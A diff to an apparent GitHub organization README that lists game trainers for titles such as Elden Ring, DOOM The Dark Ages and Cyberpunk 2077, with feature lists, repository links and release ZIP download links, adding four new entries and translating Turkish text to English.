@@ -7,7 +7,7 @@
 
 <p align="center">
   <a href="https://github.com/TrainerHubMoggyDay"><img src="https://img.shields.io/badge/org-TrainerHubMoggyDay-0ea5e9?style=for-the-badge&logo=github&logoColor=white" alt="org"/></a>
-  <a href="https://github.com/orgs/TrainerHubMoggyDay/repositories"><img src="https://img.shields.io/badge/trainers-5-22c55e?style=for-the-badge" alt="trainers"/></a>
+  <a href="https://github.com/orgs/TrainerHubMoggyDay/repositories"><img src="https://img.shields.io/badge/trainers-9-22c55e?style=for-the-badge" alt="trainers"/></a>
   <a href="https://github.com/TrainerHubMoggyDay"><img src="https://img.shields.io/badge/status-Active-111827?style=for-the-badge" alt="status"/></a>
 </p>
 
@@ -28,9 +28,85 @@ Her proje ayrı bir depodur: README, sürümler, release’ler ve net yapı.
 
 ## ⭐ Featured Trainers
 
-### 1. Gothic 1 Remake **+38**
+### 1. DOOM The Dark Ages **+23** (SlayerForge)
 
-**Gothic 1 Remake** (2026) için **+38** trainer.
+**+23** trainer for **DOOM: The Dark Ages**.
+God Mode · Infinite Ammo · One Hit · Gold · Mech / Dragon · Chain Spear
+
+<p>
+  <a href="https://github.com/TrainerHubMoggyDay/DOOM-The-Dark-Ages-Trainer-GodMode-InfiniteAmmo-OneHit-SlayerForge/releases/download/v1.0.0/Doom.Dark.Ages.Slayer.Forge.Trainer.zip"><img src="https://img.shields.io/badge/Download%20ZIP-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"/></a>
+  &nbsp;
+  <a href="https://github.com/TrainerHubMoggyDay/DOOM-The-Dark-Ages-Trainer-GodMode-InfiniteAmmo-OneHit-SlayerForge"><img src="https://img.shields.io/badge/Repository-0ea5e9?style=for-the-badge&logo=github&logoColor=white" alt="Repository"/></a>
+</p>
+
+| | |
+|---|---|
+| **Repo** | [DOOM-The-Dark-Ages-Trainer-GodMode-InfiniteAmmo-OneHit-SlayerForge](https://github.com/TrainerHubMoggyDay/DOOM-The-Dark-Ages-Trainer-GodMode-InfiniteAmmo-OneHit-SlayerForge) |
+| **ZIP** | [Doom.Dark.Ages.Slayer.Forge.Trainer.zip](https://github.com/TrainerHubMoggyDay/DOOM-The-Dark-Ages-Trainer-GodMode-InfiniteAmmo-OneHit-SlayerForge/releases/download/v1.0.0/Doom.Dark.Ages.Slayer.Forge.Trainer.zip) |
+| **Features** | God Mode, Infinite Ammo, One Hit, Gold, Mech/Dragon HP, Chain Spear (+23) |
+
+---
+
+### 2. Elden Ring **+39** (TarnishedForge)
+
+**+39** trainer for **Elden Ring**.
+God Mode · Infinite HP / FP / Stamina · Runes · One Hit · Map Unlock
+
+<p>
+  <a href="https://github.com/TrainerHubMoggyDay/Elden-Ring-Trainer-GodMode-InfiniteHP-Runes-OneHit-TarnishedForge/releases/download/v1.0.0/Elden.Ring.Trainer.v1.0.0.TarnishedForge.+39.zip"><img src="https://img.shields.io/badge/Download%20ZIP-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"/></a>
+  &nbsp;
+  <a href="https://github.com/TrainerHubMoggyDay/Elden-Ring-Trainer-GodMode-InfiniteHP-Runes-OneHit-TarnishedForge"><img src="https://img.shields.io/badge/Repository-0ea5e9?style=for-the-badge&logo=github&logoColor=white" alt="Repository"/></a>
+</p>
+
+| | |
+|---|---|
+| **Repo** | [Elden-Ring-Trainer-GodMode-InfiniteHP-Runes-OneHit-TarnishedForge](https://github.com/TrainerHubMoggyDay/Elden-Ring-Trainer-GodMode-InfiniteHP-Runes-OneHit-TarnishedForge) |
+| **ZIP** | [Elden.Ring.Trainer.v1.0.0.TarnishedForge.+39.zip](https://github.com/TrainerHubMoggyDay/Elden-Ring-Trainer-GodMode-InfiniteHP-Runes-OneHit-TarnishedForge/releases/download/v1.0.0/Elden.Ring.Trainer.v1.0.0.TarnishedForge.+39.zip) |
+| **Features** | God Mode, Infinite HP/FP/Stamina, Runes, One Hit, Map Unlock (+39) |
+
+---
+
+### 3. Resident Evil 4 Remake **+40** (SurvivorForge)
+
+**+40** trainer for **Resident Evil 4 Remake**.
+God Mode · Infinite Ammo · Pesetas · Unlock Weapons · Mercenaries
+
+<p>
+  <a href="https://github.com/TrainerHubMoggyDay/Resident-Evil-4-Remake-Trainer-GodMode-InfiniteAmmo-Pesetas-Mercenaries/releases/download/v1.0.0/Resident.Evil.4.Remake.SurvivorForge.Trainer.zip"><img src="https://img.shields.io/badge/Download%20ZIP-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"/></a>
+  &nbsp;
+  <a href="https://github.com/TrainerHubMoggyDay/Resident-Evil-4-Remake-Trainer-GodMode-InfiniteAmmo-Pesetas-Mercenaries"><img src="https://img.shields.io/badge/Repository-0ea5e9?style=for-the-badge&logo=github&logoColor=white" alt="Repository"/></a>
+</p>
+
+| | |
+|---|---|
+| **Repo** | [Resident-Evil-4-Remake-Trainer-GodMode-InfiniteAmmo-Pesetas-Mercenaries](https://github.com/TrainerHubMoggyDay/Resident-Evil-4-Remake-Trainer-GodMode-InfiniteAmmo-Pesetas-Mercenaries) |
+| **ZIP** | [Resident.Evil.4.Remake.SurvivorForge.Trainer.zip](https://github.com/TrainerHubMoggyDay/Resident-Evil-4-Remake-Trainer-GodMode-InfiniteAmmo-Pesetas-Mercenaries/releases/download/v1.0.0/Resident.Evil.4.Remake.SurvivorForge.Trainer.zip) |
+| **Features** | God Mode, Infinite Ammo, Pesetas, Unlock Weapons, Mercenaries (+40) |
+
+---
+
+### 4. Resident Evil Requiem **+28** (RequiemForge)
+
+**+28** trainer for **Resident Evil Requiem**.
+God Mode · Infinite Ammo · One Hit · Auto-QTE · Credits · Teleport
+
+<p>
+  <a href="https://github.com/TrainerHubMoggyDay/Resident-Evil-Requiem-Trainer-GodMode-InfiniteAmmo-OneHit-AutoQTE/releases/download/v1.0.0/Resident.Evil.Requiem.RequiemForge.Trainer.zip"><img src="https://img.shields.io/badge/Download%20ZIP-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"/></a>
+  &nbsp;
+  <a href="https://github.com/TrainerHubMoggyDay/Resident-Evil-Requiem-Trainer-GodMode-InfiniteAmmo-OneHit-AutoQTE"><img src="https://img.shields.io/badge/Repository-0ea5e9?style=for-the-badge&logo=github&logoColor=white" alt="Repository"/></a>
+</p>
+
+| | |
+|---|---|
+| **Repo** | [Resident-Evil-Requiem-Trainer-GodMode-InfiniteAmmo-OneHit-AutoQTE](https://github.com/TrainerHubMoggyDay/Resident-Evil-Requiem-Trainer-GodMode-InfiniteAmmo-OneHit-AutoQTE) |
+| **ZIP** | [Resident.Evil.Requiem.RequiemForge.Trainer.zip](https://github.com/TrainerHubMoggyDay/Resident-Evil-Requiem-Trainer-GodMode-InfiniteAmmo-OneHit-AutoQTE/releases/download/v1.0.0/Resident.Evil.Requiem.RequiemForge.Trainer.zip) |
+| **Features** | God Mode, Infinite Ammo, One Hit, Auto-QTE, Credits, Teleport (+28) |
+
+---
+
+### 5. Gothic 1 Remake **+38**
+
+**+38** trainer for **Gothic 1 Remake** (2026).
 God Mode · Infinite HP / Mana · XP · Ore · Lockpicks · Strength
 
 <p>
@@ -51,9 +127,9 @@ God Mode · Infinite HP / Mana · XP · Ore · Lockpicks · Strength
 
 ---
 
-### 2. Forza Horizon 6 / 5 **+27** (Redline)
+### 6. Forza Horizon 6 / 5 **+27** (Redline)
 
-**Forza Horizon 6** ve **Forza Horizon 5** için **+27** trainer.
+**+27** trainer for **Forza Horizon 6** and **Forza Horizon 5**.
 Credits · Boost · No Damage · Free Cars · Auto-Win · Wheelspins
 
 <p>
@@ -74,9 +150,9 @@ Credits · Boost · No Damage · Free Cars · Auto-Win · Wheelspins
 
 ---
 
-### 3. Cyberpunk 2077 **+46** (NetrunnerForge)
+### 7. Cyberpunk 2077 **+46** (NetrunnerForge)
 
-**Cyberpunk 2077** (+ Phantom Liberty) için **+46** trainer.
+**+46** trainer for **Cyberpunk 2077** (+ Phantom Liberty).
 God Mode · Money · One Hit · No Reload · Infinite RAM · XP · Street Cred
 
 <p>
@@ -95,9 +171,9 @@ God Mode · Money · One Hit · No Reload · Infinite RAM · XP · Street Cred
 
 ---
 
-### 4. Crimson Desert **+12**
+### 8. Crimson Desert **+12**
 
-**Crimson Desert** için **+12** trainer.
+**+12** trainer for **Crimson Desert**.
 Infinite HP / Stamina / Spirit · One Hit · Money · Game Speed · Freeze Time
 
 <p>
@@ -118,13 +194,13 @@ Infinite HP / Stamina / Spirit · One Hit · Money · Game Speed · Freeze Time
 
 ---
 
-### 5. Assassin's Creed Black Flag **Resynced**
+### 9. Assassin's Creed Black Flag **Resynced** (v1.2.0)
 
-**Assassin's Creed Black Flag Resynced** remake trainer’ı (2013 orijinali değil).
+Trainer for the **Assassin's Creed Black Flag Resynced** remake (not the 2013 original).
 God Mode · Infinite HP · Money · Jackdaw · Teleport · One Hit
 
 <p>
-  <a href="https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport/releases/download/v1.0.0/AC.Black.Flag.Resynced.BlackSails.Trainer.zip"><img src="https://img.shields.io/badge/Download%20ZIP-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"/></a>
+  <a href="https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport/releases/download/v1.2.0/AC.Black.Flag.Resynced.BlackSails.Trainer.V1.2.0.zip"><img src="https://img.shields.io/badge/Download%20ZIP-22c55e?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"/></a>
   &nbsp;
   <a href="https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport"><img src="https://img.shields.io/badge/Repository-0ea5e9?style=for-the-badge&logo=github&logoColor=white" alt="Repository"/></a>
   &nbsp;
@@ -136,8 +212,8 @@ God Mode · Infinite HP · Money · Jackdaw · Teleport · One Hit
 | | |
 |---|---|
 | **Repo** | [Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport](https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport) |
-| **ZIP** | [AC.Black.Flag.Resynced.BlackSails.Trainer.zip](https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport/releases/download/v1.0.0/AC.Black.Flag.Resynced.BlackSails.Trainer.zip) |
-| **Features** | God Mode, Infinite HP, Money, Jackdaw, Teleport, One Hit |
+| **ZIP** | [AC.Black.Flag.Resynced.BlackSails.Trainer.V1.2.0.zip](https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport/releases/download/v1.2.0/AC.Black.Flag.Resynced.BlackSails.Trainer.V1.2.0.zip) |
+| **Features** | God Mode, Infinite HP, Money, Jackdaw, Teleport, One Hit (v1.2.0) |
 
 ---
 
